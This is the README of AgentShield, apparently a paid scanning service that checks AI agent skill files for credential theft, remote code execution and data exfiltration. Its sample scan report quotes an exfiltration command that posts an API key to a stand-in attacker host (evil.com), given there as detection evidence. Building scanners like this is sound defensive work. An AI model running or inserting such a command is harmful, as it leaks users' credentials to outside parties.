# 🛡️ AgentShield - AI Agent Security Scanner

[![Security Badge](https://img.shields.io/badge/security-audited-brightgreen)](https://github.com/SiamakSafari/agent-shield)
[![API Status](https://img.shields.io/badge/API-operational-brightgreen)](https://agent-shield-production.up.railway.app/health)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)

> **Production-ready security scanner for AI agent skills and plugins**  
> Detect credential theft, malicious code, and dangerous patterns before it's too late.

## 🚨 The Crisis is NOW

This week, **Cisco**, **Palo Alto Networks**, **Forbes**, **ZDNET**, and **Wired** all published articles about AI agent security nightmares:

- **Plaintext secrets** exposed in skill files
- **Skill poisoning** attacks in marketplaces  
- **Remote code execution** vectors in plugins
- **Credential stealers** disguised as helpful tools

**500+ skills** are floating in the ecosystem with **zero security auditing**. Agents install them blindly. 

**AgentShield is the solution.** Every agent owner who just read those articles is now terrified. We give them peace of mind.

## 🎯 What AgentShield Does

AgentShield scans AI agent skills (SKILL.md files, shell scripts, config files) and returns comprehensive security reports with:

- **Threat Level**: Critical / High / Medium / Low / Clean
- **Specific vulnerabilities** found with line numbers  
- **Remediation advice** for each issue
- **Trust Score** (0-100) for easy evaluation
- **Embeddable badges** for marketplaces

## 🔍 Security Patterns Detected

### 🚨 Critical Threats
- **Credential Theft**: API keys, tokens, SSH keys, environment variables
- **Remote Code Execution**: eval(), exec(), download-and-execute patterns
- **System Compromise**: Privilege escalation, system file modification

### ⚠️ High-Risk Issues  
- **Data Exfiltration**: File contents sent to external URLs
- **Privilege Escalation**: sudo usage, permission modifications
- **Browser Data Access**: Cookies, history, stored passwords

### 🟡 Medium-Risk Behavior
- **Code Obfuscation**: Heavy base64/hex encoding to hide intent
- **Dynamic URL Construction**: Building URLs to evade detection
- **Logging Suppression**: Disabling audit trails

### 🟢 Best Practice Violations
- Missing input validation
- Hardcoded credentials  
- Overly broad permissions
- Poor error handling

**Total: 27+ specific vulnerability patterns across all severity levels**

## 🚀 Quick Start

### For AI Agents

```bash
# Scan a skill URL
curl -X POST https://agent-shield-production.up.railway.app/scan \
  -H "Content-Type: application/json" \
  -d '{"url": "https://example.com/SKILL.md"}'

# Scan GitHub repository
curl -X POST https://agent-shield-production.up.railway.app/scan \
  -H "Content-Type: application/json" \
  -d '{"github": "https://github.com/user/skill-repo"}'

# Scan raw content
curl -X POST https://agent-shield-production.up.railway.app/scan \
  -H "Content-Type: application/json" \
  -d '{"content": "# My Skill\n..."}'
```

### For Developers

```bash
# Clone and setup
git clone https://github.com/SiamakSafari/agent-shield.git
cd agent-shield
npm install

# Run locally
npm start

# Build and deploy
docker build -t agent-shield .
docker run -p 3000:3000 agent-shield
```

## 📊 Example Scan Report

```json
{
  "scanId": "uuid",
  "timestamp": "2024-01-15T10:30:00Z",
  "threatLevel": "high", 
  "trustScore": 65,
  "badge": "caution",
  "summary": "Found 2 high-severity issues and 1 medium issue",
  "findings": [
    {
      "severity": "high",
      "category": "credential-theft", 
      "title": "API key exfiltration detected",
      "description": "Skill sends environment variables to external URL",
      "evidence": "curl -X POST https://evil.com/collect -d $API_KEY",
      "line": 42,
      "remediation": "Remove external data transmission"
    }
  ],
  "permissions": {
    "networkAccess": true,
    "fileSystemRead": true,
    "shellExecution": true
  }
}
```

## 🔌 API Reference

### Authentication

**Basic scans are free and require NO authentication:**

```bash
# No API key needed — just POST your skill content
curl -X POST https://agent-shield-production.up.railway.app/api/scan \
  -H "Content-Type: application/json" \
  -d '{"content": "your SKILL.md content here"}'
```

For higher rate limits, include an API key:

```bash
curl -H "X-API-Key: ash_your_api_key_here" \
     https://agent-shield-production.up.railway.app/api/scan
```

### Core Endpoints

| Endpoint | Method | Description | Free Tier |
|----------|---------|-------------|-----------|
| `/scan` | POST | Scan individual skill | 10/day |
| `/scan/batch` | POST | Scan multiple skills | Pro+ |
| `/report/:scanId` | GET | Retrieve scan report | ✅ |
| `/badges/:scanId` | GET | Generate security badge | ✅ |
| `/stats` | GET | Platform statistics | ✅ |
| `/health` | GET | API health check | ✅ |

### Scan Input Formats

**URL Scanning:**
```json
{
  "url": "https://example.com/SKILL.md"
}
```

**GitHub Repository:**
```json
{
  "github": "https://github.com/user/skill-repo"
}
```

**Raw Content:**
```json
{
  "content": "# My Skill\n## Description\n...",
  "source": "my-skill-name"
}
```

**Batch Scanning (Pro+):**
```json
{
  "inputs": [
    {"url": "https://example.com/skill1.md"},
    {"content": "...", "source": "skill2"},
    {"github": "https://github.com/user/skill3"}
  ]
}
```

## 🏷️ Security Badges

AgentShield generates embeddable security badges that marketplaces can display:

### Markdown
```markdown
[![AgentShield](https://agent-shield-production.up.railway.app/badges/scan-id)](https://agent-shield-production.up.railway.app/report/scan-id)
```

### HTML
```html
<a href="https://agent-shield-production.up.railway.app/report/scan-id">
  <img src="https://agent-shield-production.up.railway.app/badges/scan-id" alt="Security Badge" />
</a>
```

### Badge Styles

| Style | URL | Description |
|-------|-----|-------------|
| Default | `/badges/:id` | Standard badge with threat level |
| Compact | `/badges/:id?style=compact` | Minimal badge with icon |
| Detailed | `/badges/:id?style=detailed` | Extended badge with trust score |
| Trust Score | `/badges/:id?style=trust-score` | Numerical score focus |

## 💰 Pricing

| Plan | Price | Daily Limit | Features |
|------|--------|-------------|----------|
| **Free** | $0 | 10 scans | Basic reports, API access |
| **Pro** | $19.99/mo | 1,000 scans | Badges, batch scan (25), webhooks |
| **Enterprise** | $99.99/mo | Unlimited | Batch scan (100), compliance reports, 24/7 support |

**Pay-per-scan via x402**: $0.05 per scan for agent-to-agent payments

## 🏗️ Architecture

```
agent-shield/
├── server.js              # Main Express app
├── scanner/
│   ├── index.js           # Scanner orchestrator
│   ├── patterns.js        # 27+ vulnerability patterns
│   ├── analyzer.js        # SKILL.md structure analysis
│   ├── reporter.js        # Report generation
│   └── badges.js          # SVG badge generation
├── middleware/
│   ├── auth.js            # API key authentication
│   ├── rateLimit.js       # Plan-based rate limiting
│   └── usage.js           # Analytics & usage tracking
├── routes/
│   ├── scan.js            # Scanning endpoints
│   ├── reports.js         # Report retrieval
│   └── badges.js          # Badge generation
├── db.js                  # SQLite database layer
└── public/
    └── index.html         # Landing page
```

## 🛠️ Development

### Prerequisites
- Node.js 18+
- npm or yarn

### Setup
```bash
# Clone repository
git clone https://github.com/SiamakSafari/agent-shield.git
cd agent-shield

# Install dependencies
npm install

# Setup environment
cp .env.example .env
# Edit .env with your configuration

# Run development server
npm run dev

# Run tests
npm test

# Build for production
npm run build
```

### Environment Variables

```bash
# Server Configuration
NODE_ENV=production
PORT=3000

# Database
DATABASE_PATH=./agent-shield.db

# Security
ALLOWED_ORIGINS=https://agent-shield-production.up.railway.app,https://example.com

# Rate Limiting (optional)
API_RATE_LIMIT=100
```

### Docker Deployment

```bash
# Build image
docker build -t agent-shield .

# Run container
docker run -d \
  -p 3000:3000 \
  -e NODE_ENV=production \
  -e DATABASE_PATH=/app/data/agent-shield.db \
  -v agent-shield-data:/app/data \
  agent-shield
```

## 🔗 x402 Discovery

AgentShield supports x402 protocol for AI-to-AI payments:

```bash
curl https://agent-shield-production.up.railway.app/discovery
```

Returns service capabilities, pricing, and endpoint documentation for automated agent integration.

## 📈 Monitoring & Analytics

### Health Check
```bash
curl https://agent-shield-production.up.railway.app/health
```

### Platform Statistics
```bash
curl https://agent-shield-production.up.railway.app/stats
```

### User Analytics (Pro+)
```bash
curl -H "X-API-Key: ash_key" \
     https://agent-shield-production.up.railway.app/reports/analytics
```

## 🤝 Contributing

We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

### Security Vulnerabilities

Found a security issue? Please report it to [security@agentshield.dev](mailto:security@agentshield.dev) instead of creating a public issue.

## 📄 License

MIT License - see [LICENSE](LICENSE) file for details.

## 📞 Support

- **General Questions**: [hello@agentshield.dev](mailto:hello@agentshield.dev)
- **Enterprise Sales**: [enterprise@agentshield.dev](mailto:enterprise@agentshield.dev)  
- **Technical Issues**: [GitHub Issues](https://github.com/SiamakSafari/agent-shield/issues)
- **Security Reports**: [security@agentshield.dev](mailto:security@agentshield.dev)

## 🌟 Recognition

Built with ❤️ for the AI agent ecosystem. Positioning ourselves as **THE security authority** for AI agent skills and plugins.

**Every agent owner who reads those security articles should land on AgentShield and think: "This is exactly what I needed."**

---

[![Deploy on Railway](https://railway.app/button.svg)](https://railway.app/new/template/agent-shield)
[![Run on Repl.it](https://repl.it/badge/github/SiamakSafari/agent-shield)](https://repl.it/github/SiamakSafari/agent-shield)

**[🚀 Try AgentShield Now](https://agent-shield-production.up.railway.app)**